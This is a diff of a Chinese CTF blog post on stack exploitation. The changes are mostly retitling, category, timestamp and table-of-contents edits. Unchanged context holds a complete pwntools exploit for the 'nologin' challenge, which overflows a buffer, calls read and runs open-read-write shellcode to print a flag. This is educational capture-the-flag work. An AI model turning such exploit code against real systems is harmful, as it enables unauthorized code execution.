@@ -83,7 +83,7 @@
 
 <meta name="description" content="栈">
 <meta property="og:type" content="article">
-<meta property="og:title" content="pwn之栈">
+<meta property="og:title" content="栈的漏洞利用">
 <meta property="og:url" content="http://example.com/2021/04/16/pwn%E4%B9%8B%E6%A0%88/index.html">
 <meta property="og:site_name" content="Archerの博客">
 <meta property="og:description" content="栈">
@@ -100,7 +100,7 @@
 <meta property="og:image" content="http://example.com/images/2021-09-15133315.png">
 <meta property="og:image" content="http://example.com/images/20210915200736.png">
 <meta property="article:published_time" content="2021-04-16T12:47:30.000Z">
-<meta property="article:modified_time" content="2021-10-02T12:39:26.869Z">
+<meta property="article:modified_time" content="2021-10-21T17:22:46.631Z">
 <meta property="article:author" content="Archer">
 <meta property="article:tag" content="栈">
 <meta name="twitter:card" content="summary">
@@ -138,7 +138,7 @@
 
 
 
-  <title>pwn之栈 | Archerの博客</title>
+  <title>栈的漏洞利用 | Archerの博客</title>
   
 
 
@@ -292,7 +292,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">pwn之栈</h1>
+          <h1 class="post-title" itemprop="name headline">栈的漏洞利用</h1>
         
 
         <div class="post-meta">
@@ -327,8 +327,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/canary/" itemprop="url" rel="index">
-                    <span itemprop="name">canary</span>
+                  <a href="/categories/%E6%A0%88/" itemprop="url" rel="index">
+                    <span itemprop="name">栈</span>
                   </a>
                 </span>
 
@@ -344,7 +344,7 @@
 
           
           
-             <span id="/2021/04/16/pwn%E4%B9%8B%E6%A0%88/" class="leancloud_visitors" data-flag-title="pwn之栈">
+             <span id="/2021/04/16/pwn%E4%B9%8B%E6%A0%88/" class="leancloud_visitors" data-flag-title="栈的漏洞利用">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -480,6 +480,7 @@ b.通过覆盖canary的最后一位(\x00)来输出canary剩下的内容
 <h3 id="例题1-羊城杯nologin"><a href="#例题1-羊城杯nologin" class="headerlink" title="例题1.羊城杯nologin"></a>例题1.羊城杯nologin</h3><p>64位保护就开了FULL relro,这个题不是很难，比赛的时候也没怎么看(大意了x，<br>并且有rwx段，只要能把orw写道rwx段上就可以getshell了<br>禁用了execve，功能2中存在溢出，可以修改rbp以及rip，通过将rip覆盖为read，可以向栈上面读入shellcode，然后<br>call，rsi，就能通过布置在栈上的shellcode，将栈迁移到rwx段上，然后直接orw就可以了(需要注意的一点是注意./flag的地址)</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p =  process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc-2.27.so&quot;</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;input&gt;&gt; \n&quot;</span>)	</span><br><span class="line">p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;password: \n&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;aaaaa&quot;</span> + p64(<span class="number">0x602000</span>) + p64(elf.plt[<span class="string">&quot;read&quot;</span>]) + p64(<span class="number">0x40186b</span>)</span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">		xor rax,rax;</span></span><br><span class="line"><span class="string">		mov rsi,0x602000;</span></span><br><span class="line"><span class="string">		mov rdx,0x100;</span></span><br><span class="line"><span class="string">		syscall;</span></span><br><span class="line"><span class="string">		add rsi,0x10;</span></span><br><span class="line"><span class="string">		jmp rsi;</span></span><br><span class="line"><span class="string">		&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">len</span>(shellcode)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">shellcode1 = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">		 xor rax, rax;</span></span><br><span class="line"><span class="string">		 mov rax, 2;</span></span><br><span class="line"><span class="string">		 mov rdi, 0x602008;</span></span><br><span class="line"><span class="string">		 xor rsi, rsi;</span></span><br><span class="line"><span class="string">		 xor rdx, rdx;</span></span><br><span class="line"><span class="string">		 syscall;</span></span><br><span class="line"><span class="string">		 mov rdi, rax;</span></span><br><span class="line"><span class="string">		 xor rax, rax;</span></span><br><span class="line"><span class="string">		 mov rsi, 0x602300;</span></span><br><span class="line"><span class="string">		 mov rdx, 0x100;</span></span><br><span class="line"><span class="string">		 syscall; </span></span><br><span class="line"><span class="string">		 mov rax, 1;</span></span><br><span class="line"><span class="string">		 mov rdi, 1;</span></span><br><span class="line"><span class="string">		 syscall;</span></span><br><span class="line"><span class="string">		 &#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload = <span class="string">&quot;./flag\x00\x00&quot;</span>*<span class="number">2</span> + shellcode1</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
+<h2 id="exit-hook"><a href="#exit-hook" class="headerlink" title="exit_hook"></a>exit_hook</h2>
       
     </div>
     
@@ -519,8 +520,8 @@ b.通过覆盖canary的最后一位(\x00)来输出canary剩下的内容
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2021/04/16/pwn%E4%B9%8B%E5%A0%86/" rel="prev" title="pwn中堆的学习">
-                pwn中堆的学习 <i class="fa fa-chevron-right"></i>
+              <a href="/2021/05/06/%E5%A0%86%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" rel="prev" title="堆的漏洞利用">
+                堆的漏洞利用 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -602,7 +603,7 @@ b.通过覆盖canary的最后一位(\x00)来输出canary剩下的内容
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">26</span>
+                  <span class="site-state-item-count">25</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -613,7 +614,7 @@ b.通过覆盖canary的最后一位(\x00)来输出canary剩下的内容
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-count">15</span>
                   <span class="site-state-item-name">categories</span>
                 </a>
               </div>
@@ -694,7 +695,7 @@ b.通过覆盖canary的最后一位(\x00)来输出canary剩下的内容
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#canary%E6%B3%84%E6%BC%8F"><span class="nav-number">1.</span> <span class="nav-text">canary泄漏</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC1%E7%A7%8D%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%EF%BC%9A"><span class="nav-number">1.1.</span> <span class="nav-text">第1种绕过方式：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC2%E7%A7%8D%E6%96%B9%E5%BC%8F%EF%BC%9A"><span class="nav-number">1.2.</span> <span class="nav-text">第2种方式：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC3%E7%A7%8D%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8Fstack-smash"><span class="nav-number">1.3.</span> <span class="nav-text">第3种绕过方式stack smash</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB"><span class="nav-number">2.</span> <span class="nav-text">栈迁移</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E"><span class="nav-number">3.</span> <span class="nav-text">格式化字符串漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">3.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E8%A6%86%E7%9B%96%E5%8F%98%E9%87%8F%E7%9A%84%E5%80%BC-%E5%B0%8F%E6%95%B0%E5%AD%97"><span class="nav-number">3.2.</span> <span class="nav-text">1.覆盖变量的值(小数字)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%B3%84%E9%9C%B2got%E8%A1%A8%E6%88%96%E8%80%85%E5%8F%98%E9%87%8F%E7%9A%84%E5%9C%B0%E5%9D%80"><span class="nav-number">3.3.</span> <span class="nav-text">2.泄露got表或者变量的地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E6%94%B9got%E8%A1%A8%E3%80%81%E6%94%B9%E5%9C%B0%E5%9D%80"><span class="nav-number">3.4.</span> <span class="nav-text">3.改got表、改地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-bss%E6%AE%B5%E6%88%96%E5%A0%86%E4%B8%8A%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E"><span class="nav-number">3.5.</span> <span class="nav-text">4.bss段或堆上的格式化字符串漏洞</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%9D%E7%BA%A7ROP"><span class="nav-number">4.</span> <span class="nav-text">初级ROP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%AD%E7%BA%A7ROP"><span class="nav-number">5.</span> <span class="nav-text">中级ROP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%AB%98%E7%BA%A7ROP"><span class="nav-number">6.</span> <span class="nav-text">高级ROP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2dl"><span class="nav-number">6.1.</span> <span class="nav-text">ret2dl</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#srop"><span class="nav-number">6.2.</span> <span class="nav-text">srop</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BE%8B%E9%A2%981-buu-ciscn-2019-s-3"><span class="nav-number">6.3.</span> <span class="nav-text">例题1.buu ciscn_2019_s_3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BE%8B%E9%A2%982-buu-rootersctf-2019-srop"><span class="nav-number">6.4.</span> <span class="nav-text">例题2.buu rootersctf_2019_srop</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">6.5.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2vdso"><span class="nav-number">6.6.</span> <span class="nav-text">ret2vdso</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FSOP"><span class="nav-number">7.</span> <span class="nav-text">FSOP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BE%8B%E9%A2%981-hitcontraninghouseoforange-2016"><span class="nav-number">7.1.</span> <span class="nav-text">例题1.hitcontraninghouseoforange_2016</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#setcontext"><span class="nav-number">8.</span> <span class="nav-text">setcontext</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BE%8B%E9%A2%981-ciscn-2021-silverwolf"><span class="nav-number">8.1.</span> <span class="nav-text">例题1.ciscn_2021_silverwolf</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BE%8B%E9%A2%982-ciscn-2021-game"><span class="nav-number">8.2.</span> <span class="nav-text">例题2.ciscn_2021_game</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#orw%E8%AF%A6%E8%A7%A3"><span class="nav-number">9.</span> <span class="nav-text">orw详解</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BE%8B%E9%A2%981-%E7%BE%8A%E5%9F%8E%E6%9D%AFnologin"><span class="nav-number">9.1.</span> <span class="nav-text">例题1.羊城杯nologin</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#canary%E6%B3%84%E6%BC%8F"><span class="nav-number">1.</span> <span class="nav-text">canary泄漏</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC1%E7%A7%8D%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%EF%BC%9A"><span class="nav-number">1.1.</span> <span class="nav-text">第1种绕过方式：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC2%E7%A7%8D%E6%96%B9%E5%BC%8F%EF%BC%9A"><span class="nav-number">1.2.</span> <span class="nav-text">第2种方式：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC3%E7%A7%8D%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8Fstack-smash"><span class="nav-number">1.3.</span> <span class="nav-text">第3种绕过方式stack smash</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB"><span class="nav-number">2.</span> <span class="nav-text">栈迁移</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E"><span class="nav-number">3.</span> <span class="nav-text">格式化字符串漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">3.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E8%A6%86%E7%9B%96%E5%8F%98%E9%87%8F%E7%9A%84%E5%80%BC-%E5%B0%8F%E6%95%B0%E5%AD%97"><span class="nav-number">3.2.</span> <span class="nav-text">1.覆盖变量的值(小数字)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%B3%84%E9%9C%B2got%E8%A1%A8%E6%88%96%E8%80%85%E5%8F%98%E9%87%8F%E7%9A%84%E5%9C%B0%E5%9D%80"><span class="nav-number">3.3.</span> <span class="nav-text">2.泄露got表或者变量的地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E6%94%B9got%E8%A1%A8%E3%80%81%E6%94%B9%E5%9C%B0%E5%9D%80"><span class="nav-number">3.4.</span> <span class="nav-text">3.改got表、改地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-bss%E6%AE%B5%E6%88%96%E5%A0%86%E4%B8%8A%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E"><span class="nav-number">3.5.</span> <span class="nav-text">4.bss段或堆上的格式化字符串漏洞</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%9D%E7%BA%A7ROP"><span class="nav-number">4.</span> <span class="nav-text">初级ROP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%AD%E7%BA%A7ROP"><span class="nav-number">5.</span> <span class="nav-text">中级ROP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%AB%98%E7%BA%A7ROP"><span class="nav-number">6.</span> <span class="nav-text">高级ROP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2dl"><span class="nav-number">6.1.</span> <span class="nav-text">ret2dl</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#srop"><span class="nav-number">6.2.</span> <span class="nav-text">srop</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BE%8B%E9%A2%981-buu-ciscn-2019-s-3"><span class="nav-number">6.3.</span> <span class="nav-text">例题1.buu ciscn_2019_s_3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BE%8B%E9%A2%982-buu-rootersctf-2019-srop"><span class="nav-number">6.4.</span> <span class="nav-text">例题2.buu rootersctf_2019_srop</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">6.5.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2vdso"><span class="nav-number">6.6.</span> <span class="nav-text">ret2vdso</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FSOP"><span class="nav-number">7.</span> <span class="nav-text">FSOP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BE%8B%E9%A2%981-hitcontraninghouseoforange-2016"><span class="nav-number">7.1.</span> <span class="nav-text">例题1.hitcontraninghouseoforange_2016</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#setcontext"><span class="nav-number">8.</span> <span class="nav-text">setcontext</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BE%8B%E9%A2%981-ciscn-2021-silverwolf"><span class="nav-number">8.1.</span> <span class="nav-text">例题1.ciscn_2021_silverwolf</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BE%8B%E9%A2%982-ciscn-2021-game"><span class="nav-number">8.2.</span> <span class="nav-text">例题2.ciscn_2021_game</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#orw%E8%AF%A6%E8%A7%A3"><span class="nav-number">9.</span> <span class="nav-text">orw详解</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BE%8B%E9%A2%981-%E7%BE%8A%E5%9F%8E%E6%9D%AFnologin"><span class="nav-number">9.1.</span> <span class="nav-text">例题1.羊城杯nologin</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exit-hook"><span class="nav-number">10.</span> <span class="nav-text">exit_hook</span></a></li></ol></div>
             
 
           </div>
